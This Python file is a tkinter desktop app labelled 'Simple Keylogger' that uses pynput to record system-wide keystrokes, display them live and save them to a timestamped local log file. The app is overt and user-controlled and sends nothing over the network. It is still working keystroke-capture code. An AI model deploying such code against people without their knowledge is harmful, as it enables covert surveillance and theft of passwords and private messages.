import os
import tkinter as tk
from tkinter import scrolledtext, messagebox
from pynput import keyboard
from datetime import datetime

class HoverButton(tk.Button):
    def __init__(self, master=None, **kw):
        tk.Button.__init__(self, master=master, **kw)
        self.defaultBackground = self["background"]
        self.defaultForeground = self["foreground"]
        self.bind("<Enter>", self.on_enter)
        self.bind("<Leave>", self.on_leave)
    def on_enter(self, e):
        self['background'] = self['activebackground']
        self['foreground'] = self['activeforeground']
    def on_leave(self, e):
        self['background'] = self.defaultBackground
        self['foreground'] = self.defaultForeground

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Simple Keylogger - Enhanced UI")
        self.root.geometry("640x460")
        self.root.resizable(False, False)
        self.root.configure(bg="#282c34")

        self.is_logging = False
        self.log = ""
        self.listener = None
        self.log_file = None

        self.create_widgets()
        self.prepare_log_file()

    def prepare_log_file(self):
        # Create logs directory if it doesn't exist
        logs_dir = "logs"
        if not os.path.exists(logs_dir):
            os.makedirs(logs_dir)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = os.path.join(logs_dir, f"keylog_{timestamp}.txt")

    def create_widgets(self):
        header_frame = tk.Frame(self.root, bg="#282c34", pady=15)
        header_frame.pack(fill='x')

        header_label = tk.Label(
            header_frame,
            text="Simple Keylogger",
            font=("Segoe UI", 24, "bold"),
            fg="#61dafb",
            bg="#282c34"
        )
        header_label.pack()

        underline = tk.Frame(
            header_frame, bg="#61dafb", height=2, width=180
        )
        underline.pack(pady=4)

        btn_frame = tk.Frame(self.root, bg="#282c34")
        btn_frame.pack(pady=20)

        button_opts = {
            'width': 16,
            'height': 2,
            'font': ("Segoe UI", 12, "bold"),
            'borderwidth': 0,
            'relief': 'flat',
            'activebackground': '#61dafb',
            'activeforeground': '#282c34',
            'background': '#3a3f4b',
            'foreground': 'white',
            'cursor': 'hand2',
        }

        self.start_btn = HoverButton(btn_frame, text="Start Logging", command=self.start_logging, **button_opts)
        self.start_btn.grid(row=0, column=0, padx=12)

        self.stop_btn = HoverButton(btn_frame, text="Stop Logging", command=self.stop_logging, state='disabled', **button_opts)
        self.stop_btn.grid(row=0, column=1, padx=12)

        self.save_btn = HoverButton(btn_frame, text="Save Log", command=self.save_log, state='disabled', **button_opts)
        self.save_btn.grid(row=0, column=2, padx=12)

        log_frame = tk.Frame(self.root, bg="#21252b", bd=2, relief='sunken')
        log_frame.pack(padx=15, pady=10, fill='both', expand=True)

        self.text_area = scrolledtext.ScrolledText(
            log_frame,
            width=75,
            height=20,
            font=("Consolas", 12),
            bg="#1e2127",
            fg="#abb2bf",
            insertbackground='white',
            relief='flat',
            wrap='word'
        )
        self.text_area.pack(fill='both', expand=True)
        self.text_area.config(state='disabled')

    def on_press(self, key):
        try:
            if hasattr(key, "char") and key.char is not None:
                self.log += key.char
                self.update_text(key.char)
            else:
                # Handle special keys gracefully
                name = str(key).replace('Key.', '').upper()
                if key == keyboard.Key.space:
                    self.log += " "
                    self.update_text(" ")
                elif key == keyboard.Key.enter:
                    self.log += "\n"
                    self.update_text("\n")
                elif key == keyboard.Key.tab:
                    self.log += "\t"
                    self.update_text("\t")
                else:
                    self.log += f" [{name}] "
                    self.update_text(f" [{name}] ")
        except Exception as e:
            # Failsafe to not crash the app
            print(f"Error logging key: {e}")

    def update_text(self, char):
        self.text_area.config(state='normal')
        self.text_area.insert(tk.END, char)
        self.text_area.see(tk.END)
        self.text_area.config(state='disabled')

    def start_logging(self):
        if not self.is_logging:
            self.is_logging = True
            self.log = ""
            self.text_area.config(state='normal')
            self.text_area.delete(1.0, tk.END)
            self.text_area.config(state='disabled')

            self.start_btn.config(state='disabled')
            self.stop_btn.config(state='normal')
            self.save_btn.config(state='disabled')

            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()

            self.update_text(f"[Logging started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")
            self.update_text(f"[Saving to file: {self.log_file}]\n")

    def stop_logging(self):
        if self.is_logging:
            self.listener.stop()
            self.is_logging = False
            self.start_btn.config(state='normal')
            self.stop_btn.config(state='disabled')
            self.save_btn.config(state='normal')

            self.update_text(f"\n[Logging stopped at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")

    def save_log(self):
        if self.log_file:
            try:
                with open(self.log_file, 'a', encoding='utf-8') as file:
                    file.write(self.log)
                messagebox.showinfo("Success", f"Log saved successfully to:\n{self.log_file}")
                self.save_btn.config(state='disabled')
            except Exception as e:
                messagebox.showerror("Error", f"Could not save log:\n{e}")

def main():
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()

if __name__ == "__main__":
    main()

